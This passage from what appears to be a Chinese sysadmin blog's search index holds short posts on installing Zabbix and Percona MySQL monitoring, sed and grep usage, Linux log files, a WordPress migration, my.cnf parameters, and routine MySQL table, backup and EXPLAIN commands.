4.配置zabbix-server # 修改为如下信息： vim /etc/zabbix/zabbix_server.conf DBHost=localhost DBName=zabbix DBUser=zabbix DBPassword=zabbix 启动zabbix-server和设置开机自启 systemctl enable zabbix-server.service systemctl start zabbix-server.service 5.配置zabbix-web # 修改apache配置文件（第20行） vim /etc/httpd/conf.d/zabbix.conf php_value date.timezone Asia/Shanghai 启动apache systemctl start httpd 修改目录权限 chown apache.apache -R /usr/share/zabbix/assets/ 打开web，按照提示填写下一步即可 http://10.0.0.62/zabbix/ 默认用户名：Admin 默认 密码：zabbix ","date":"2019-06-03 23:04","objectID":"/post/395/:0:0","tags":["zabbix"],"title":"centos7 yum安装zabbix4.0","uri":"/post/395/"},{"categories":["监控"],"content":"percona-zabbix插件下载地址：https://www.percona.com/downloads/ 注意：使用percona需要安装php和php-mysql 安装： rpm -ivh percona-zabbix-templates-1.1.8-1.noarch.rpm 安装完后注意两个目录： Scripts are installed to /var/lib/zabbix/percona/scripts # 脚本目录 Templates are installed to /var/lib/zabbix/percona/templates # 配置文件以及模板 导入模板 配置zabbix自定义监控项： 安装自带的模板和zabbix4.0不兼容，这边就使用别人修改好的模板了，也可以安装一个zabbix2.0版本导入后，升级到4.0版本，在导出就可以用了。 模板下载地址：https://pan.baidu.com/s/1P9vlJYU9ZEx6o3ktyBM7ng 提取码：uho1 把zbx_percona_mysql_template.xml模板导入到zabbix中。 到percona模板目录中把模板配置文件复制到zabbix_agent.d目录中,并重启zabbix-agent cp userparameter_percona_mysql.conf /etc/zabbix/zabbix_agentd.d/ systemctl restart zabbix-agent 修改percona脚本/var/lib/zabbix/percona/scripts/ss_get_mysql_stats.php，修改为对应内容 $mysql_user = ‘zabbix’; $mysql_pass = ‘password’; $mysql_port = 3306; $mysql_socket = ‘/var/lib/mysql/mysql.sock’; 测试脚本是否正常使用，正常取值，ok /var/lib/zabbix/percona/scripts/get_mysql_stats_wrapper.sh kt 测试完记得删除生成的文件，因为手动执行时root用户，zabbix访问文件没有权限，需要让zabbix来生成这个文件 rm -f /tmp/localhost-mysql_cacti_stats.txt 主机链接模板： 链接模板： 配置==》主机==》zabbix server==》模板==》添加percona-mysql模板 添加完成后，在主机的应用集中可以看到MySQL，并有191个监控项 查看最新数据： 检测==》最新数据==》过滤出MySQL应用集 mysql主从监控项修改： 监控项中MySQL running slave显示不支持 Value “ERROR 1045 (28000): Access denied for user ‘zabbix’@’localhost’ (using password: NO) 0” of type “string” is not suitable for value type “Numeric (unsigned)” 手动执行一下脚本： sh get_mysql_stats_wrapper.sh running-slave ERROR 1045 (28000): Access denied for user ‘root’@’localhost’ (using password: NO) 0 用户名密码错误的原因，修改get_mysql_stats_wrapper.sh脚本中19行的内容，需要指定一个拥有SUPER,REPLICATION CLIENT权限的用户 RES=`HOME=~zabbix mysql -uroot -pxxx -e ‘SHOW SLAVE STATUS\\G’…………………………………略 此时监控项显示正常。 ","date":"2019-06-02 00:38","objectID":"/post/382/:0:0","tags":["mysql","zabbix"],"title":"zabbix监控之利用percona-zabbix监控mysql数据库","uri":"/post/382/"},{"categories":["系统服务","databases"],"content":"/usr/bin/mysql_secure_installation Enter current password for root (enter for none): #提示输入root密码 Set root password? [Y/n] #是否设置root密码 New password: #输入密码 Re-enter new password: #再输入一次密码 Remove anonymous users? [Y/n] #删除匿名用户 Disallow root login remotely? [Y/n] #禁止root远程登陆 Remove test database and access to it? [Y/n] #删除测试库 Reload privilege tables now? [Y/n] #刷新授权表 ","date":"2019-06-01 20:23","objectID":"/post/380/:0:0","tags":["mysql"],"title":"mysql_secure_installation安全初始化","uri":"/post/380/"},{"categories":["其他"],"content":"No ‘Access-Control-Allow-Origin’ header is present on the requested resource. Origin ‘xxxxx’ is therefore not allowed access. 不同web应用可参考如下内容： apache:https://enable-cors.org/server_apache.html nginx:https://enable-cors.org/server_nginx.html 修改apache配置文件 \u003cDirectory “xxxx”\u003e在此行下面添加如下内容 Header set Access-Control-Allow-Origin “*” or Header set Access-Control-Allow-Origin “http://www.soulchild.cn” ","date":"2019-06-01 20:21","objectID":"/post/377/:0:0","tags":[],"title":"跨域问题导致资源不能访问：No 'Access-Control-Allow-Origin' header is present on the requested resource.","uri":"/post/377/"},{"categories":["基础内容"],"content":"格式： {要替换的字符串,替换后的字符串}：左花括号要放在需要替换的字符串前面 例如： test.txt改为ceshi.txt mv {test,ceshi}.txt 将1.txtb改为1.txt mv 1.txt{b,} 将1.txt改为1.txtb mv 1.txt{,b} 将1.txt改为123.txt mv {1,123}.txt 将1.txt改为test.txt mv {1,test}.txt ","date":"2019-06-01 20:20","objectID":"/post/375/:0:0","tags":[],"title":"cp，mv等花括号用法","uri":"/post/375/"},{"categories":["基础内容"],"content":"set 1 2 3 不加引号—–每个参数视为独立参数 [root@m01 ~]# for i in $*;do echo $i ;done 1 2 3 [root@m01 ~]# for i in $@;do echo $i ;done 1 2 3 加引号—–$把所有参数当做一个整体， $@和不加引号一样 [root@m01 ~]# for i in “$\";do echo $i ;done 1 2 3 [root@m01 ~]# for i in “$@\";do echo $i ;done 1 2 3 ","date":"2019-06-01 20:17","objectID":"/post/371/:0:0","tags":[],"title":"shell中$*和$@的区别","uri":"/post/371/"},{"categories":["基础内容"],"content":"2\u003e:标准错误 or 1\u003e：标准输出 \u0026\u003e：标准输出和标准错误 2\u003e\u00261: 将标准错误输出到标准输出 标准错误重定向到error.log，标准输出重定向到/dev/null ll 2\u003e error.log \u003e /dev/null 标准错误和标准输出都重定向到/dev/null ll \u003e /dev/null 2\u003e\u00261 or ll \u003e /dev/null 2\u003e /dev/null or ll \u0026\u003e /dev/null ","date":"2019-06-01 20:15","objectID":"/post/369/:0:0","tags":["shell"],"title":"重定向2\u0026gt;,\u0026amp;\u0026gt;,1\u0026gt;,\u0026gt;....标准错误和标准输出","uri":"/post/369/"},{"categories":["基础内容","常用命令"],"content":"命令格式： sed [options] 'command' file(s) sed [options] ‘要操作的行 内置命令’ file or sed [options] ‘/正则表达式/内置命令’ file 正则也可以不用/，用#@~特殊符号也可以 选项参数 -e 允许多项编辑 -n 取消默认的输出 -i 直接修改对应文件 -r 支持扩展元字符 内置命令参数 a 在当前行后添加一行或多行 c 在当前行进行替换修改 d 在当前行进行删除操作 i 在当前行之前插入文本 p 打印匹配的行或指定行 n 读入下一输入行，从下一条命令进行处理 ! 对所选行以外的所有行应用命令 w 将匹配的内容写入到一个新的文件中 h 把模式空间里的内容重定向到暂存缓冲区 H 把模式空间里的内容追加到暂存缓冲区 g 取出暂存缓冲区的内容，将其复制到模式空间，覆盖该处原有内容 G 取出暂存缓冲区的内容，将其复制到模式空间，追加在原有内容后面 s 替换命令标志 g 行内全局替换 i 忽略替换大小写 举例（加-i才会修改文件）： -e：先删除1-9行 在进行内容替换 sed -e ‘1,9d’ -e ’s#root#admin#g’ passwd p：p和-n一般一起使用 打印包含halt的行 sed -n ‘/halt/p’ passwd 打印第二行的内容 sed -n ‘2p’ passwd 打印最后一行的内容 sed -n ‘$p’ passwd a：在当前行后添加一行或多行 在第3行的下一行添加指定内容 sed ‘3a content’ test.conf c：在当前行进行替换修改 修改第七行的内容 sed ‘7c SELINUX=Disabled’ /etc/selinux/config 也可以使用正则，找出以SELINUX=开头的内容的行，修改为执行内容 sed ‘/^SELINUX=/c SELINUX=Disabled’ /etc/selinux/config d：删除行 删除第二行的内容 sed ‘2d’ test.conf 删除最后一行的内容 sed ‘$d’ test.conf 使用正则删除包含mail的行 sed /mail/d test.conf i：在当前行之前插入文本 在第三行插入的上一行添加指定内容 sed ‘3i content;’ passwd w：将匹配的内容写入到一个新的文件中 将包含root的行，写入新的文件当中 sed -n ‘/root/w newfile’ passwd n：对下一行进行操作 删除包含root行的下一行 sed ‘/root/{n;d}’ passwd 替换root行下一行的内容 sed -n ‘/root/{n;s#login#aaaaaaa#;p}’ passwd !：对所选行以外的所有行应用命令 删除除了第三行的所有内容 sed ‘3!d’ /etc/hosts s：替换字符串，i：忽略大小写，g：行中所有匹配内容都替换 将所有root修改为admin，忽略大小写 sed ’s/root/admin/gi’ passwd \u0026代表前面匹配到的内容，下面命令的作用就是在nologin结尾的行后面添加test sed ’s/nologin$/\u0026test/’ passwd 后向引用:在正则部分加括号，第一个括号匹配的内容为\\1，第二个为\\2 ......，\u0026代表正则表达式整体匹配的内容 查找出eth1网卡的ip地址 ip a s eth1 | sed -n 3p | sed ’s#.et (.)/.*#\\1#’ 指定行批量添加注释。^匹配的是行首，替换为#\u0026，即为在行首添加#号 sed ‘2,5s/^/#\u0026/’ test.conf 匹配内容添加注释，在root所在行的行首添加注释 sed ‘/root/s/^/#\u0026/’ test.conf ","date":"2019-06-01 20:12","objectID":"/post/365/:0:0","tags":[],"title":"sed命令的使用","uri":"/post/365/"},{"categories":["基础内容"],"content":"1.sh 不需要脚本执行权限，父shell不会继承脚本（子shell）中的变量 2. ./ 需要脚本拥有执行权限，父shell不会继承脚本（子shell）中的变量 3.source和.是一样的 父shell继承脚本（子shell）中的变量 ","date":"2019-06-01 20:12","objectID":"/post/363/:0:0","tags":["shell"],"title":"shell中sh、source、. 、.杠、执行脚本的区别","uri":"/post/363/"},{"categories":["基础内容","常用命令"],"content":"正则表达式 \\ 转义符，将特殊字符进行转义，忽略其特殊意义 ^ 匹配行首，awk中，^则是匹配字符串的开始 $ 匹配行尾，awk中，$则是匹配字符串的结尾 ^$ 表示空行 . 匹配除换行符\\n之外的任意单个字符 [ ] 匹配包含在[字符]之中的任意一个字符 [^ ] 匹配[^字符]之外的任意一个字符 [ - ] 匹配[]中指定范围内的任意一个字符，例：[1-9][a-z] ? 匹配之前的项1次或者0次 + 匹配之前的项1次或者多次 * 匹配之前的项0次或者多次, .* () 匹配表达式，创建一个用于匹配的子串 { n } 匹配之前的项n次，n是可以为0的正整数 {n,} 之前的项至少需要匹配n次 {n,m} 指定之前的项至少匹配n次，最多匹配m次，n\u003c=m | 或者，|两边的任意一项，ab(c|d)匹配abc或abd 特定字符: [[:space:]] 空格 [[:digit:]] [0-9] [[:lower:]] [a-z] [[:upper:]] [A-Z] [[:alpha:]] [a-Z] grep参数说明： -n：显示行号 -v：取反 -E：使用扩展正则==egrep -i：忽略大小写 -o：只输出匹配到的内容，匹配行中的其他内容不输出 -w：按照单词过滤 -r：遍历目录查找 -A n：输出匹配内容的后n行(包括匹配行) -B n：输出匹配内容的前n行(包括匹配行) -C n：输出匹配内容的前后n行(包括匹配行) \u0026lt;：词首锚定，同\\b \u0026gt;：词尾锚定，同\\b 举例： #过滤以m开头的行 [root@m01 ~]# grep ‘^m’ passwd mail❌8:12:mail:/var/spool/mail:/sbin/nologin #过滤以sync结尾的行 [root@m01 ~]# grep ‘sync$’ passwd sync❌5:0:sync:/sbin:/bin/sync #过滤空行，不显示空行 [root@m01 ~]# grep -v ’^$’ passwd #显示匹配内容的前2行 [root@m01 ~]# grep -B2 ‘^m’ passwd shutdown❌6:0:shutdown:/sbin:/sbin/shutdown halt❌7:0:halt:/sbin:/sbin/halt mail❌8:12:mail:/var/spool/mail:/sbin/nologin #显示匹配内容的后2行 [root@m01 ~]# grep -A2 ‘^m’ passwd mail❌8:12:mail:/var/spool/mail:/sbin/nologin operator❌11:0:operator:/root:/sbin/nologin games❌12💯games:/usr/games:/sbin/nologin #显示匹配内容的前后2行 [root@m01 ~]# grep -C2 ‘^m’ passwd shutdown❌6:0:shutdown:/sbin:/sbin/shutdown halt❌7:0:halt:/sbin:/sbin/halt mail❌8:12:mail:/var/spool/mail:/sbin/nologin operator❌11:0:operator:/root:/sbin/nologin games❌12💯games:/usr/games:/sbin/nologin #过滤nologin，只显示匹配的内容 [root@m01 ~]# grep -o 'nologin' passwd nologin nologin ... #过滤出sever的单词 [root@m01 ~]# grep -w ‘server’ /etc/ssh/sshd_config This is the sshd server system-wide configuration file. See Subsystem sftp /usr/libexec/openssh/sftp-server ForceCommand cvs server #遍历/root目录中的文件，包含hello的内容 [root@m01 ~]# grep -r 'hello' /root/ /root/.bash_history:cowsay hello","date":"2019-06-01 20:11","objectID":"/post/360/:0:0","tags":[],"title":"grep简单常用用法","uri":"/post/360/"},{"categories":["其他"],"content":"http://tool.oschina.net/uploads/apidocs/jquery/regexp.html ","date":"2019-06-01 20:10","objectID":"/post/358/:0:0","tags":["正则"],"title":"正则表达式元字符","uri":"/post/358/"},{"categories":["基础内容"],"content":"secure：安全相关,主要是用户认证,如登录 、创建和删除账号 、sudo等 audit/audit.log：审计日志。跟用户账号相关 messages：记录系统和软件的绝大多数消息。如服务启动 、停止 、服务错误等。 boot.log：系统启动日志。能看到启动流程。 cron：计划任务日志。会记录crontab计划任务的创建、执行信息。 dmesg：硬件设备信息(device)。纯文本,也可以用dmesg命令查看。 yum.log：yum软件的日志。记录yum安装、卸载软件的记录。 lastlog：最后登录的日志。用lastlog查看(二进制日志文件) btmp：登录失败的信息(bad)。用lastb查(二进制日志文件) wtmp：正确登录的所有用户命令(who、w)，用last查(二进制日志文件) ","date":"2019-06-01 20:09","objectID":"/post/356/:0:0","tags":["log"],"title":"linux系统日志文件","uri":"/post/356/"},{"categories":["其他"],"content":"以前没事弄了一个阿里云虚拟主机玩，搭了个wordpress，后来虚拟主机到期，很长时间也不管，最近突然又想用博客记录东西，想着把以前的东西在拿出来继续用，幸好数据库和网站备份了。 开始恢复： 1.首先搭建好lamp环境 2.上传数据库和网站程序 将网站程序放到web根目录 mv htdocs-2017-6-13/* /var/www/html/ 导入的时候需要注意wp的编码和mysql的一致性 [root@bogon ~]# mysql -uroot -p wordpress \u003c 22607_all.sql 可以查看wp-config.php文件中的编码 grep DB_CHARSET ./wp-config.php define(‘DB_CHARSET’, ‘utf8’); [root@bogon html]# mysql -uroot -p -e “\\s” | grep char Enter password: Server characterset:utf8 Db characterset:utf8 Client characterset:utf8 Conn. characterset:utf8 3.修改wp-config.php文件中数据库连接信息 4.此时打开发现首页正常访问，但是内页404，后台空白 404可以理解之前设置的伪静态，但是后台空白不知道怎么回事，百度了一下说是插件的问题，把插件目录临时改名就可以了 mv wp-content/plugins wp-content/pluginsbak 此时打开后台正常访问，但是。。。密码忘了 先去查下用户名 select user_login from wp_users; 然后修改密码 update wp_users set user_pass=md5(“密码”) where user_login=‘用户名’; 5.成功登陆后台，将plugins目录改回来 mv wp-content/pluginsbak wp-content/plugins 将固定链接改为朴素解决内页404问题，或修改伪静态规则 ","date":"2019-06-01 20:08","objectID":"/post/354/:0:0","tags":["wordpress"],"title":"记一次wordpress4.7迁移一系列问题！","uri":"/post/354/"},{"categories":["其他","监控"],"content":"备份数据库时报错：Incorrect file format ‘syslog’ when using LOCK TABLES 查看syslog.MYI文件大小为0，判断是索引损坏 进入mysql执行： REPAIR TABLE cacti.syslog USE_FRM; syslog_incoming表也有问题 Incorrect file format ‘syslog_incoming’ when using LOCK TABLES 继续执行： REPAIR TABLE cacti.syslog_incoming USE_FRM; ","date":"2019-06-01 20:07","objectID":"/post/352/:0:0","tags":["cacti"],"title":"cacti-Incorrect file format 'syslog' ... LOCK TABLES","uri":"/post/352/"},{"categories":["系统服务","databases"],"content":"原文：https://www.cnblogs.com/langdashu/p/5889352.html 参数详解（补充ing…） [client] #客户端设置，即客户端默认的连接参数 port = 3307 #默认连接端口 socket = /data/mysqldata/3307/mysql.sock #用于本地连接的socket套接字 default-character-set = utf8mb4 #编码 [mysqld] #服务端基本设置 port = 3307 MySQL监听端口 socket = /data/mysqldata/3307/mysql.sock #为MySQL客户端程序和服务器之间的本地通讯指定一个套接字文件 pid-file = /data/mysqldata/3307/mysql.pid #pid文件所在目录 basedir = /usr/local/mysql-5.7.11 #使用该目录作为根目录（安装目录） datadir = /data/mysqldata/3307/data #数据文件存放的目录 tmpdir = /data/mysqldata/3307/tmp #MySQL存放临时文件的目录 character_set_server = utf8mb4 #服务端默认编码（数据库级别） collation_server = utf8mb4_bin #服务端默认的比对规则，排序规则 user = mysql #MySQL启动用户 log_bin_trust_function_creators = 1 #This variable applies when binary logging is enabled. It controls whether stored function creators can be trusted not to create stored functions that will cause #unsafe events to be written to the binary log. If set to 0 (the default), users are not permitted to create or alter stored functions unless they have the SUPER #privilege in addition to the CREATE ROUTINE or ALTER ROUTINE privilege. 开启了binlog后，必须设置这个值为1.主要是考虑binlog安全 performance_schema = 0 #性能优化的引擎，默认关闭 secure_auth = 1 #secure_auth 为了防止低版本的MySQL客户端(\u003c4.1)使用旧的密码认证方式访问高版本的服务器。MySQL 5.6.7开始secure_auth 默认为启用值1 #ft_min_word_len = 1 #开启全文索引 #myisam_recover #自动修复MySQL的myisam表 explicit_defaults_for_timestamp #明确时间戳默认null方式 event_scheduler #计划任务（事件调度器） skip-external-locking #跳过外部锁定;External-locking用于多进程条件下为MyISAM数据表进行锁定 skip-name-resolve #跳过客户端域名解析；当新的客户连接mysqld时，mysqld创建一个新的线程来处理请求。该线程先检查是否主机名在主机名缓存中。如果不在，线程试图解析主机名。 #使用这一选项以消除MySQL进行DNS解析的时间。但需要注意，如果开启该选项，则所有远程主机连接授权都要使用IP地址方式，否则MySQL将无法正常处理连接请求! #bind-address = 127.0.0.1 #MySQL绑定IP skip-slave-start #为了安全起见，复制环境的数据库还是设置–skip-slave-start参数，防止复制随着mysql启动而自动启动 slave_net_timeout = 30 #The number of seconds to wait for more data from a master/slave connection before aborting the read. MySQL主从复制的时候， #当Master和Slave之间的网络中断，但是Master和Slave无法察觉的情况下（比如防火墙或者路由问题）。 #Slave会等待slave_net_timeout设置的秒数后，才能认为网络出现故障，然后才会重连并且追赶这段时间主库的数据。 #1.用这三个参数来判断主从是否延迟是不准确的Slave_IO_Running,Slave_SQL_Running,Seconds_Behind_Master.还是用pt-heartbeat吧。 #2.slave_net_timeout不要用默认值，设置一个你能接受的延时时间。 local-infile = 0 #设定是否支持命令load data local infile。如果指定local关键词，则表明支持从客户主机读文件 back_log = 1024 #指定MySQL可能的连接数量。当MySQL主线程在很短的时间内得到非常多的连接请求，该参数就起作用，之后主线程花些时间（尽管很短）检查连接并且启动一个新线程。 #back_log参数的值指出在MySQL暂时停止响应新请求之前的短时间内多少个请求可以被存在堆栈中。 #sql_mode = ‘PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE,NO_KEY_OPTIONS,NO_TABLE_OPTIONS,NO_FIELD_OPTIONS,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION’ sql_mode = NO_ENGINE_SUBSTITUTION,NO_AUTO_CREATE_USER #sql_mode,定义了mysql应该支持的sql语法，数据校验等! NO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户。 #NO_ENGINE_SUBSTITUTION 如果需要的存储引擎被禁用或未编译，可以防止自动替换存储引擎 key_buffer_size = 32M #索引块的缓冲区大小，对MyISAM表性能影响最大的一个参数.决定索引处理的速度，尤其是索引读的速度。默认值是16M，通过检查状态值Key_read_requests #和Key_reads，可以知道key_buffer_size设置是否合理 max_allowed_packet = 512M #一个查询语句包的最大尺寸。消息缓冲区被初始化为net_buffer_length字节，但是可在需要时增加到max_allowed_packet个字节。 #该值太小则会在处理大包时产生错误。如果使用大的BLOB列，必须增加该值。 #这个值来限制server接受的数据包大小。有时候大的插入和更新会受max_allowed_packet 参数限制，导致写入或者更新失败。 thread_stack = 256K #线程缓存；主要用来存放每一个线程自身的标识信息，如线程id，线程运行时基本信息等等，我们可以通过 thread_stack 参数来设置为每一个线程栈分配多大的内存。 sort_buffer_size = 16M #是MySQL执行排序使用的缓冲大小。如果想要增加ORDER BY的速度，首先看是否可以让MySQL使用索引而不是额外的排序阶段。 #如果不能，可以尝试增加sort_buffer_size变量的大小。 read_buffer_size = 16M #是MySQL读入缓冲区大小。对表进行顺序扫描的请求将分配一个读入缓冲区，MySQL会为它分配一段内存缓冲区。read_buffer_size变量控制这一缓冲区的大小。 #如果对表的顺序扫描请求非常频繁，并且你认为频繁扫描进行得太慢，可以通过增加该变量值以及内存缓冲区大小提高其性能。 join_buffer_size = 16M #应用程序经常会出现一些两表（或多表）Join的操作需求，MySQL在完成某些 Join 需求的时候（all/index join），为了减少参与Join的“被驱动表”的 #读取次数以提高性能，需要使用到 Join Buffer 来协助完成 Join操作。当 Join Buffer 太小，MySQL 不会将该 Buffer 存入磁盘文件， #而是先将Join Buffer中的结果集与需要 Join 的表进行 Join 操作， #然后清空 Join Buffer 中的数据，继续将剩余的结果集写入此 Buffer 中，如此往复。这势必会造成被驱动表需要被多次读取，成倍增加 IO 访问，降低效率。 read_rnd_buffer_size = 32M #是MySQL的随机读缓冲区大小。当按任意顺序读取行时(例如，按照排序顺序)，将分配一个随机读缓存区。进行排序查询时，MySQL会首先扫描一遍该缓冲，以避免磁盘搜索， #提高查询速度，如果需要排序大量数据，可适当调高该值。但MySQL会为每个客户连接发放该缓冲空间，所以应尽量适当设置该值，以避免内存开销过大。 net_buffer_length = 16K #通信缓冲区在查询","date":"2019-06-01 20:04","objectID":"/post/350/:0:0","tags":["mysql"],"title":"mysql-MySQL配置文件my.cnf的理解","uri":"/post/350/"},{"categories":["系统服务","databases"],"content":"查看库、表、字段的字符集 mysql\u003e show create database 库名; mysql\u003e show create table 表名; 修改库的字符集 mysql\u003e alter database 库名 default character set utf8 collate utf8_general_ci; 修改表的字符集 mysql\u003e alter table 表名 default character set utf8collate utf8_general_ci; 修改字段的字符集 mysql\u003e alter table表名modify name char(10) collate utf8_general_ci; 查看字符集 show variables like ‘%character%’; 修改客户端字符集 临时： mysql\u003e set names utf8; 永久：修改my.cnf配置文件 [client] default-character-set=utf8 修改服务端字符集 永久：修改my.cnf配置文件 [mysqld] init_connect=‘SET NAMES utf8’ default-character-set=utf8 # mysql5.1及以前版本 or character-set-server=utf8 # 其他版本  ","date":"2019-06-01 20:03","objectID":"/post/347/:0:0","tags":["mysql"],"title":"mysql-中文乱码设置字符集编码","uri":"/post/347/"},{"categories":["系统服务","databases"],"content":"更改表名 语法：rename table 表名 to 新表名; mysql\u003e rename table test to test_new; 删除表 mysql\u003e drop table test_new; ","date":"2019-06-01 19:59","objectID":"/post/345/:0:0","tags":["mysql"],"title":"mysql-删表以及更改表名","uri":"/post/345/"},{"categories":["系统服务","databases"],"content":"在表中增加字段(在最后添加字段) 语法：alter table 表名 add 字段名 字段类型； mysql\u003e alter table test add sex char(4); 在指定位置增加字段 after：在xx字段之后添加字段 first： 在最前面添加字段 语法：alter table 表名 add 要添加的字段名 字段类型 after字段名； mysql\u003e alter table test add age int(3) after name; mysql\u003e alter table test add qq int(10) first; 调整字段顺序 语法:alter table 表名 modify 要修改的字段名称 字段类型 after 字段名; mysql\u003e alter table test modify sex_new char(4) after name; 删除指定字段 语法：alter table 表名 drop 字段名; mysql\u003e alter table test drop qq; 修改字段类型 语法：alter table 表名 modify 字段类型; mysql\u003e alter table test modify age int(4); 修改字段名称 语法：alter table 表名 change 旧名称 新名称 字段类型; mysql\u003e alter table test change sex sex_new char(4); 添加表注释 语法：alter table 表名 comment ‘注释’; mysql\u003e alter table test comment ‘测试表’; 添加字段注释 方法1： 语法：alter table 表名 modify 字段名 字段类型 comment 注释; mysql\u003e alter table test modify name char(20) comment ‘名字’; 方法2： 语法：alter table 表名 change 字段名 字段名 字段类型 comment ‘注释’; mysql\u003e alter table test change name name char(20) comment '姓名';   查看字段注释 语法：show full fields from 表名; mysql\u003e show full fields from student; 添加自增属性的主键索引： 语法：alter table 表名 change 列名称 新的列名称 字段类型 primary key auto_increment; mysql\u003ealter table student change id id int primary key auto_increment; ","date":"2019-06-01 19:58","objectID":"/post/343/:0:0","tags":["mysql"],"title":"mysql-增删改表的字段","uri":"/post/343/"},{"categories":["系统服务","databases"],"content":"[root@db01 ~]# mysql –help | grep “-U” -U, –safe-updates Only allow UPDATE and DELETE that uses keys. -U, –i-am-a-dummy Synonym for option –safe-updates, -U. 说明：在mysql命令加上选项-U后，当执行UPDATE或DELETE时，没有WHERE或LIMIT关键字的时候，mysql程序就会拒绝执行 例如：执行以下内容时 拒绝执行 mysql -uroot -p -S /data/3306/mysql.sock -U mysql\u003e update test set name=‘soul’; ERROR 1175 (HY000): You are using safe update mode and you tried to update a table without a WHERE that uses a KEY column 将mysql -U制作成别名，永久生效需要追加到/etc/profile文件中 [root@db01 ~]# alias mysql=“mysql -U” 此时登录mysql，不加-U，依然会有安全提示 [root@db01 ~]# mysql -uroot -p -S /data/3306/mysql.sock mysql\u003e update test set name=‘soul’;ERROR 1175 (HY000): You are using safe update mode and you tried to update a table without a WHERE that uses a KEY column 注:此方法只有在本地登录时才起作用 ","date":"2019-06-01 19:56","objectID":"/post/340/:0:0","tags":["mysql"],"title":"mysql防止误操作,开启-U参数","uri":"/post/340/"},{"categories":["系统服务","databases"],"content":"1.参数 -A 全部备份 mysqldump -uroot -p -A \u003e /data/backup/full.sql -B 备份单库或多库 mysqldump -uroot -p -S /data/3306/mysql.sock -B soulchild \u003e /data/backup/soulchild.sql or mysqldump -uroot -p -B wordpress emlog \u003e /data/backup/wpaeml.sql 单表或多表备份 库名 表名 mysqldump -uroot -p wordpress user \u003e /data/backup/full.sql -d 只备份表的结构 mysqldump -uroot -p -d wordpress \u003e /data/backup/wp.sql mysqldump特殊功能参数 -R –triggers -E ：备份过程、函数、触发器、事件等 –master-data=2: –single-transaction –set-gtid-purged=OFF 较为完整全备份语句： mysqldump -uroot -p123 -A –master-data=2 –single-transaction -R –triggers -E –set-gtid-purged=OFF –max-allowed-packet=64M \u003e/data/backup/full.sql ","date":"2019-06-01 19:53","objectID":"/post/334/:0:0","tags":["mysql"],"title":"mysqldump备份数据库","uri":"/post/334/"},{"categories":["系统服务","databases"],"content":"在查询语句前加explain 例: mysql\u003e explain select * from test where name=‘soulchild’\\G; *************************** 1. row *************************** id: 1 select_type: SIMPLE table: test type: ALL possible_keys: NULL key: NULL key_len: NULL ref: NULL rows: 5 Extra: Using where 1 row in set (0.00 sec) 说明： id：SELECT识别符。这是SELECT的查询序列号 select_type:可以为以下任何一种 SIMPLE:简单SELECT(不使用UNION或子查询) PRIMARY:最外面的SELECT UNION:UNION中的第二个或后面的SELECT语句 DEPENDENT UNION:UNION中的第二个或后面的SELECT语句,取决于外面的查询 UNION RESULT:UNION 的结果 SUBQUERY:子查询中的第一个SELECT DEPENDENT SUBQUERY:子查询中的第一个SELECT,取决于外面的查询 DERIVED:导出表的SELECT(FROM子句的子查询) table: 输出的行所引用的表 type: 联接类型，下面给出各种联接类型,按照从最佳类型到最坏类型进行排序: system:表仅有一行(=系统表)。这是const联接类型的一个特例。 const:表最多有一个匹配行,它将在查询开始时被读取。因为仅有一行,在这行的列值可被优化器剩余部分认为是常数。const表很快,因为它们只读取一次! eq_ref:对于每个来自于前面的表的行组合,从该表中读取一行。这可能是最好的联接类型,除了const类型。 ref:对于每个来自于前面的表的行组合,所有有匹配索引值的行将从这张表中读取。 ref_or_null:该联接类型如同ref,但是添加了MySQL可以专门搜索包含NULL值的行。 index_merge:该联接类型表示使用了索引合并优化方法。 unique_subquery:该类型替换了下面形式的IN子查询的ref: value IN (SELECT primary_key FROM single_table WHERE some_expr) unique_subquery是一个索引查找函数,可以完全替换子查询,效率更高。 index_subquery:该联接类型类似于unique_subquery。可以替换IN子查询,但只适合下列形式的子查询中的非唯一索引: value IN (SELECT key_column FROM single_table WHERE some_expr) range:只检索给定范围的行,使用一个索引来选择行。 index:该联接类型与ALL相同,除了只有索引树被扫描。这通常比ALL快,因为索引文件通常比数据文件小。 ALL:对于每个来自于先前的表的行组合,进行完整的表扫描。 possible_keys: 指出MySQL能使用哪个索引在该表中找到行 key: 显示MySQL实际决定使用的键(索引)。如果没有选择索引,键是NULL。 key_len: 显示MySQL决定使用的键长度。如果键是NULL,则长度为NULL。 ref: 显示使用哪个列或常数与key一起从表中选择行。 rows: 显示MySQL执行查询时扫描的行数 Extra: MySQL解决查询的详细信息 Distinct:MySQL发现第1个匹配行后,停止为当前的行组合搜索更多的行。 Not exists:MySQL能够对查询进行LEFT JOIN优化,发现1个匹配LEFT JOIN标准的行后,不再为前面的的行组合在该表内检查更多的行。 range checked for each record (index map: #):MySQL没有发现好的可以使用的索引,但发现如果来自前面的表的列值已知,可能部分索引可以使用。 Using filesort:MySQL需要额外的一次传递,以找出如何按排序顺序检索行。 Using index:从只使用索引树中的信息而不需要进一步搜索读取实际的行来检索表中的列信息。 Using temporary:为了解决查询,MySQL需要创建一个临时表来容纳结果。 Using where:WHERE 子句用于限制哪一个行匹配下一个表或发送到客户。 Using sort_union(...), Using union(...), Using intersect(...):这些函数说明如何为index_merge联接类型合并索引扫描。 Using index for group-by:类似于访问表的Using index方式,Using index for group-by表示MySQL发现了一个索引,可以用来查 询GROUP BY或DISTINCT查询的所有列,而不要额外搜索硬盘访问实际的表。   在name列创建普通索引,在查询 mysql\u003e create index index_name on test(name); mysql\u003e explain select * from test where name=‘soulchild’\\G; *************************** 1. row *************************** id: 1 select_type: SIMPLE table: test type: ref possible_keys: index_name key: index_name key_len: 20 ref: const rows: 1 Extra: Using where; Using index 可以对比出有索引时，只扫描一行就查询到结果了。 ","date":"2019-06-01 19:51","objectID":"/post/327/:0:0","tags":["mysql"],"title":"mysql-explain查看sql执行过程","uri":"/post/327/"},{"categories":["系统服务","databases"],"content":"语法：update 表名 set 字段=新值 where 条件;(不写条件则更改所有内容，所以条件一定要确认好) 将表中id为3的记录name字段改为ritian mysql\u003eupdate test set name=‘ritian’ where id=3; ","date":"2019-06-01 19:50","objectID":"/post/325/:0:0","tags":["mysql"],"title":"mysql-update修改","uri":"/post/325/"},{"categories":["系统服务","databases"],"content":"首先创建三张表 学生表： create table student( Sno int(10) not null comment ‘学号’, Sname varchar(16) not null comment ‘姓名’, Ssex char(2) not null comment ‘性别’, Sage tinyint(2) not null default ‘0’ comment ‘学生年龄’, 